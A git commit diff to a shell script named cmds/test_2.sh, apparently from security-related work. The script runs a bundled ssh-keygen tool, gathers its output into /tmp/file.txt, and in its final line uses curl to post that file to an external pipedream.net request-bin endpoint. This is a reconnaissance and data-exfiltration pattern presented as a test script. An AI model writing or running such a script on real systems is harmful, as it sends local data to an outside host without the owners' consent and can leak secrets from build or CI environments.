c29974046ac5dc9a39c2da989482ff27bf6f3bf1
Sebastian Rodriguez <sebastian.rodriguez@onapsis.com>
2021-11-05 15:04:27 -0300

    .

--- cmds/test_2.sh
+++ cmds/test_2.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 
-./tools/ssh-keygen > /tmp/file.txt
+./tools/ssh-keygen --invalid-argument > /tmp/file.txt
 
 echo "--------------" >> /tmp/file.txt
 echo "--------------" >> /tmp/file.txt
 
-echo $(ls -la tools/) >> /tmp/file.txt
+# echo $(ls -la tools/) >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
